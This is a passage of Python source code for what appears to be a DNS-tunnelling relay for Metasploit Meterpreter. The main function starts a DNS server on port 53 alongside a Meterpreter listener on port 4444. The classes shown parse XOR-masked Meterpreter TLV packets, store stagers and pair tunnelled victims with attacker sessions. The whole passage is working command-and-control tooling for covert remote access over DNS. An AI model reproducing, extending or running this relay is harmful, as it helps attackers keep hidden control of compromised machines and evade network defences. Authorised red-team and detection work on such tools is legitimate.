        id_size_byte = self._read_data(1)
        if id_size_byte and len(id_size_byte) == 1:
            id_size = struct.unpack("B", id_size_byte)[0]
            return id_size, None
        else:
            return 0, None

    def _read_id_complete(self, data):
        MSFClient.LOGGER.info("Id read is done")
        self.msf_id = data.get_data()
        if self._setup_client():
            MSFClient.LOGGER.info("New client is found.")
            self._setup_status_request_reader()
        else:
            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription",
                                  self.msf_id)
            self.parted_reader = None
            self.wait_client = True
            Registrator.instance().subscribe(self.msf_id, self)

    def _read_stage_header(self, data):
        MSFClient.LOGGER.info("Start reading stager")
        data_size_b = self._read_data(4)
        if data_size_b and len(data_size_b) == 4:
            data_size = struct.unpack("<I", data_size_b)[0]
            MSFClient.LOGGER.info("Stager size is %d bytes", data_size)
            return data_size+4, data_size_b
        else:
            return 0, None

    def _read_stage_complete(self, data):
        MSFClient.LOGGER.info("Stage read is done")
        Registrator.instance().add_stager_for_server(self.msf_id, data.get_data())
        self._setup_status_request_reader()

    def _read_status_request(self, data):
        MSFClient.LOGGER.info("Start reading status request")
        data_size = 1
        return data_size, None

    def _read_status_complete(self, data):
        MSFClient.LOGGER.info("Status request is read")
        if self.client:
            MSFClient.LOGGER.info("Client is exists, send true")
            self.sock.send("\x01")
            self._setup_tlv_reader()
        elif self._setup_client():
            MSFClient.LOGGER.info("New client is found, send true")
            self.sock.send("\x01")
            self._setup_tlv_reader()
            self.wait_client = False
        else:
            MSFClient.LOGGER.info("There are no clients, send false")
            self.sock.send("\x00")

    def _read_stage_complete_data_drop(self, data):
        MSFClient.LOGGER.info("Stage read is done. Drop data and continue.")
        if self._setup_client():
            MSFClient.LOGGER.info("Client is found.Setup tlv reader.")
            self._setup_tlv_reader()
        else:
            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription", self.msf_id)
            self.parted_reader = None
            self.wait_client = True
            Registrator.instance().subscribe(self.msf_id, self)

    def _read_tlv_header(self, data):
        header = self._read_data(MSFClient.HEADER_SIZE - len(data))
        if not header:
            return 0, None

        header = data + header
        if len(header) != MSFClient.HEADER_SIZE:
            MSFClient.LOGGER.info("Can't read full header(%s - %d)", self.sock, len(header))
            return -1, header

        if len(data) != 0:
            MSFClient.LOGGER.info("Full header is read succesfully(%s)", self.sock)
        MSFClient.LOGGER.debug("PARSE HEADER")
        xor_key = header[:4]
        pkt_length_binary = xor_bytes(xor_key, header[24:28])
        pkt_length = struct.unpack('>I', pkt_length_binary)[0]
        MSFClient.LOGGER.info("Packet length %d", pkt_length)
        return pkt_length+24, header

    def _read_tlv_complete(self, data):
        MSFClient.LOGGER.info("All data from server is read. Sending to client.")
        if self.client:
            self.client.server_put_data(data.get_data())
        else:
            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)

    def _setup_client(self):
        """
        Check if client is exists for this server and setup server-client links
        :return: True if client is found and False otherwise
        """
        if not self.msf_id:
            MSFClient.LOGGER.error("There are no msf id!!!")
            return False
        client = Registrator.instance().get_new_client_for_server(self.msf_id)
        if client:
            self.client = client
            client.set_server(self)
            MSFClient.LOGGER.info("Association client-server is done successfully(%s(%s)<->%s)",
                                   self.msf_id, str(self), self.client.get_id())
            return True
        return False

    def read_new_data(self):
        with self.lock:
            if self.wait_client:
                MSFClient.LOGGER.error("Data is received in waiting client state.Can't not be here!!!!")
                return
            if self.parted_reader:
                self.parted_reader.read()

    def want_write(self):
        if self.client:
            return self.client.server_has_data()
        return False

    def polling(self):
        self.server.poll()

    def write_data(self):
        if self.client:
            data = self.client.server_get_data()
            if data:
                MSFClient.LOGGER.info("Send data to server - %d bytes", len(data))
                self.sock.send(data)

    def close(self):
        self.sock.close()
        self.sock = None

    def on_client_timeout(self):
        MSFClient.LOGGER.info("Closing connection.(client timeout)")
        self.client = None
        self.server.remove_me(self)
        self.close()
        self.polling()


class MSFListener(object):
    SELECT_TIMEOUT = 10

    def __init__(self, listen_addr="0.0.0.0", listen_port=4444):
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.setblocking(False)
        self.shutdown_event = threading.Event()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.clients = []
        pipe = os.pipe()
        self.poll_pipe = (os.fdopen(pipe[0], "r", 0), os.fdopen(pipe[1], "w", 0))
        self.loop_thread = None

    def remove_me(self, client):
        with ignored(ValueError):
            self.clients.remove(client)

    def poll(self):
        self.poll_pipe[1].write("\x90")

    def shutdown(self):
        self.logger.info("request for shutdown server")
        self.shutdown_event.set()
        self.poll()
        if self.loop_thread:
            self.loop_thread.join()
        self.loop_thread = None

    def start_loop(self):
        self.loop_thread = threading.Thread(target=self.loop)
        self.loop_thread.daemon = True
        self.loop_thread.start()

    def loop(self):
        self.logger.info("Server internal loop started.")
        self.listen_socket.bind((self.listen_addr, self.listen_port))
        self.listen_socket.listen(1)

        while not self.shutdown_event.is_set():
            inputs = [self.listen_socket, self.poll_pipe[0]]
            outputs = []

            for cl in self.clients:
                s = cl.get_socket()
                if s:
                    inputs.append(s)
                    if cl.want_write():
                        outputs.append(s)

            read_lst, write_lst, exc_lst = select.select(inputs, outputs, inputs, MSFListener.SELECT_TIMEOUT)

            # handle input
            for s in read_lst:
                if s is self.listen_socket:
                    connection, address = s.accept()
                    self.logger.info("Incoming connection from address %s", address)
                    self.clients.append(MSFClient(connection, self))
                elif s is self.poll_pipe[0]:
                    self.logger.debug("Polling")
                    s.read(1)
                else:
                    self.logger.info("Socket is ready for reading")
                    for cl in self.clients:
                        if cl.get_socket() == s:
                            cl.read_new_data()

            # handle write
            for s in write_lst:
                for cl in self.clients:
                    if cl.get_socket() == s:
                        cl.write_data()
        # close sockets after exit from loop
        self.listen_socket.close()
        for cl in self.clients:
            cl.close()
        self.logger.info("Internal loop is ended")


class TCPRequestHandler(BaseRequestHandlerDNS):
    TRANSPORT = BaseRequestHandlerDNS.TRANSPORT_TCP

    def get_data(self):
        data = self.request.recv(8192)
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):
    TRANSPORT = BaseRequestHandlerDNS.TRANSPORT_UDP

    def get_data(self):
        return self.request[0]

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
    parser.add_argument('--domain', type=str, required=True, help='The domain name')
    parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')

    args = parser.parse_args()
    ns_records = []

    D = DomainName(args.domain + '.')  # Init domain string
    ns_records.append(NS(D.ns1))
    ns_records.append(NS(D.ns2))

    DnsServer.create(args.domain, args.ipaddr, ns_records)

    logger.info("Creating MSF listener ...")
    listener = MSFListener('0.0.0.0', args.lport)
    listener.start_loop()

    logger.info("Starting nameserver ...")
    servers = [SocketServer.UDPServer(('', args.dport), UDPRequestHandler),
               SocketServer.TCPServer(('', args.dport), TCPRequestHandler)]

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Shutdown server...")
        Registrator.instance().shutdown()
        for s in servers:
            s.shutdown()
        listener.shutdown()
        logging.shutdown()


if __name__ == '__main__':
    main()
